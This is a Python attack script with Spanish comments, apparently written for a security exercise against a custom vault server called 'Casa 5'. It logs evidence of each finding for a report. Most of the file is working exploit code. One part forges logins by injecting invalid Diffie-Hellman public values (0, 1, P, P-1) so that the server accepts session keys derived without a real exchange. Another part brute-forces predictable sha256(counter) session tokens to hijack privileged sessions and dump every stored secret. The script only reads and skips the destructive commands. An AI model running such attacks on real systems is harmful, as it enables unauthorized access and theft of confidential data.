"""
ataque.py - Ataque a la Boveda de la Casa 5 ("La ratonera") y captura de evidencia.

Corre contra la Casa 5 (la real el dia del ataque, o una copia local para ensayar) y
guarda en un archivo con fecha la evidencia de cada hallazgo, lista para el informe.

Hallazgos que documenta:

  [1] Control de roles (CORRECTO).   El invitado ratonton (perfil "hacinado") hace login,
      pero cualquier CMD_ASK suyo recibe ERR_ALLOW. La autorizacion por rol SI funciona.

  [2] Clave Diffie-Hellman invalida (VULNERABLE).   Con A en {0, 1, P, P-1} el login
      responde LOGIN_OK con mac_ok=True. La Casa 5 no valida el valor publico A, asi que
      derivamos sus mismas claves de sesion sin hacer el intercambio real (small-subgroup).

  [3] Token de sesion predecible + perfil tomado del token (VULNERABLE, lee la boveda).
      El token es sha256(str(contador)) con un contador que arranca en 1, y en cada comando
      el servidor toma el perfil del TOKEN, no del login (servidor.py: usuario, perfil =
      validar_token(tk)). Entrando como invitado y mandando un token adivinado de una
      sesion de jefe o integrante activa, el invitado lee TODA la boveda. Es robo de sesion
      por token predecible. Ademas el token sobrevive a su conexion: vale hasta que expira.

Este script SOLO lee (CMD_ASK). Nunca borra (CMD_DEL) ni manda el cierre de emergencia
(CMD_END), que en la Casa 5 destruye la boveda de forma irreversible.

Uso:   python ataque.py <IP> [puerto] [--n N]
       <IP>     127.0.0.1 para ensayar en local; la IP de la boveda el dia del ataque.
       [puerto] 6005 por defecto.
       --n N    cuantos tokens sha256(str(1..N)) probar en [3] (por defecto 400).
Correr con `python` (no `python -I`): usa la libreria cryptography.
"""

import datetime
import hashlib
import json
import os
import sys

import casa5
from casa5 import P

USUARIO = "ratonton"       # invitado, publico en el PDF del protocolo
CLAVE = "ratoncinado"


def token_predecible(n):
    """Token de sesion de la Casa 5: sha256(str(contador)) (servidor.py: _generar_token).
    El contador arranca en 1 y sube de uno en uno por cada login, asi que los tokens de
    sesion son adivinables probando n = 1, 2, 3, ..."""
    return hashlib.sha256(str(n).encode("utf-8")).hexdigest()


class Evidencia:
    """Escribe cada linea a la pantalla y, al mismo tiempo, al archivo de evidencia."""
    def __init__(self, ruta):
        self.archivo = open(ruta, "w", encoding="utf-8")
        self.ruta = ruta

    def __call__(self, linea=""):
        print(linea)
        self.archivo.write(linea + "\n")
        self.archivo.flush()

    def cerrar(self):
        self.archivo.close()


def sesion_invitado(ip, puerto, log):
    """[1] Login de invitado y un CMD_ASK: debe devolver ERR_ALLOW (rol correcto)."""
    log("[1] Sesion de invitado  (control de roles, debe estar protegido)")
    try:
        with casa5.ClienteCasa5(ip, puerto) as c:
            c.handshake()
            tipo, mac_ok, _ = c.login(USUARIO, CLAVE)
            log(f"    LOGIN            -> {casa5.nombre(tipo)}  mac_ok={mac_ok}")
            if tipo == casa5.LOGIN_OK:
                tipo, _, _ = c.comando(casa5.CMD_ASK)   # con nuestro propio token (hacinado)
                esperado = "  (se espera ERR_ALLOW: el invitado no puede leer)"
                log(f"    CMD_ASK          -> {casa5.nombre(tipo)}{esperado}")
    except Exception as e:
        log(f"    fallo la sesion de invitado ({type(e).__name__}: {e})")
    log("")


def una_inyeccion(ip, puerto, log, etiqueta, A, Ks, intentos=1):
    """Un caso de [2]: manda el A invalido y prueba sus K conocidos. Marca VULNERABLE
    apenas un login responde LOGIN_OK con mac_ok=True (el servidor derivo el mismo K que
    nosotros, o sea acepto el A invalido). Para A=P-1 el K vale 1 si el secreto b del
    servidor es par y P-1 si es impar; como b cambia en cada conexion, se reintenta."""
    for _ in range(intentos):
        for K in Ks:
            try:
                with casa5.ClienteCasa5(ip, puerto) as c:
                    c.handshake(A_forzado=A, K_forzado=K)
                    tipo, mac_ok, _ = c.login(USUARIO, CLAVE)
                    if tipo == casa5.LOGIN_OK and mac_ok:
                        log(f"    {etiqueta:<16} -> LOGIN_OK  mac_ok=True   [VULNERABLE]")
                        return
            except casa5.ErrorCasa5:
                pass   # K equivocado para este b: el servidor corto, probamos de nuevo
            except Exception as e:
                log(f"    {etiqueta:<16} -> error ({type(e).__name__}: {e})")
                return
    log(f"    {etiqueta:<16} -> no entro en {intentos} intentos   [frenado]")


def ataque_clave_invalida(ip, puerto, log):
    """[2] Claves DH invalidas: A en {0, 1, P, P-1}. Las tres primeras son deterministas."""
    log("[2] Clave Diffie-Hellman invalida  (el servidor no valida A)")
    una_inyeccion(ip, puerto, log, "A=0    (K=0)", 0, (0,))
    una_inyeccion(ip, puerto, log, "A=1    (K=1)", 1, (1,))
    una_inyeccion(ip, puerto, log, "A=P    (K=0)", P, (0,))
    una_inyeccion(ip, puerto, log, "A=P-1  (K=1/P-1)", P - 1, (1, P - 1), intentos=6)
    log("")


def leer_todo(c, token):
    """Lee la boveda entera paginando con el token dado. Devuelve (leyo_algo, secretos)."""
    secretos = []
    pagina = 0
    while True:
        tipo, _, datos = c.comando(casa5.CMD_ASK, token=token, pagina=pagina)
        if tipo != casa5.RET_OK or not isinstance(datos, dict):
            return bool(secretos), secretos
        secretos.extend(datos.get("datos") or [])
        total = datos.get("total_paginas", 1)
        pagina += 1
        if pagina >= total:
            return True, secretos


def robo_de_sesion(ip, puerto, log, n_max):
    """[3] Entra como invitado y prueba tokens sha256(str(1..n_max)) hasta leer la boveda."""
    log("[3] Token de sesion predecible + perfil tomado del token  (robo de sesion)")
    log(f"    el token es sha256(str(contador)); probando contador = 1..{n_max}")
    for n in range(1, n_max + 1):
        tok = token_predecible(n)
        try:
            with casa5.ClienteCasa5(ip, puerto) as c:
                c.handshake()                              # handshake normal, nada forzado
                tipo, _, _ = c.login(USUARIO, CLAVE)       # entra como invitado (hacinado)
                if tipo != casa5.LOGIN_OK:
                    log(f"    el login de invitado fallo: {casa5.nombre(tipo)}")
                    return
                # pedimos la boveda, pero con el token ADIVINADO en vez del nuestro
                leyo, secretos = leer_todo(c, tok)
                if leyo:
                    log(f"    [EXITO] contador={n}  token={tok[:16]}...")
                    log(f"    la boveda se leyo con el token de OTRA sesion ({len(secretos)} secretos):")
                    for s in secretos:
                        log(f"        {json.dumps(s, ensure_ascii=False)}")
                    log("")
                    return
        except casa5.ErrorCasa5:
            pass   # token equivocado: el servidor corto la conexion, probamos el siguiente
        except Exception as e:
            log(f"    contador={n}: error ({type(e).__name__}: {e})")
    log(f"    ninguna sesion de jefe/integrante activa en el rango 1..{n_max}.")
    log("    la falla sigue siendo real (esta en el codigo del servidor): con una sesion")
    log("    privilegiada abierta, este mismo barrido lee toda la boveda.")
    log("")


def leer_args(argv):
    """Devuelve (ip, puerto, n_max) desde la linea de comandos."""
    ip = argv[1]
    puerto, n_max = 6005, 400
    resto = argv[2:]
    i = 0
    while i < len(resto):
        if resto[i] == "--n" and i + 1 < len(resto):
            n_max = int(resto[i + 1])
            i += 2
        else:
            puerto = int(resto[i])
            i += 1
    return ip, puerto, n_max


def main():
    if len(sys.argv) < 2:
        print("Uso: python ataque.py <IP_de_la_boveda> [puerto] [--n N]")
        print("     La IP se saca con `hostname -I` en la maquina de la boveda. Puerto 6005.")
        return
    ip, puerto, n_max = leer_args(sys.argv)

    carpeta = os.path.dirname(os.path.abspath(__file__))
    sello = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    ruta = os.path.join(carpeta, f"evidencia-casa5-{sello}.txt")
    log = Evidencia(ruta)

    log("=" * 72)
    log("EVIDENCIA DE ATAQUE A LA BOVEDA DE LA CASA 5 (La ratonera)")
    log(f"Objetivo : {ip}:{puerto}")
    log(f"Fecha    : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    log("=" * 72)
    log("")
    sesion_invitado(ip, puerto, log)
    ataque_clave_invalida(ip, puerto, log)
    robo_de_sesion(ip, puerto, log, n_max)
    log("=" * 72)
    log.cerrar()
    print(f"\n[ok] Evidencia guardada en:\n{ruta}")


if __name__ == "__main__":
    main()
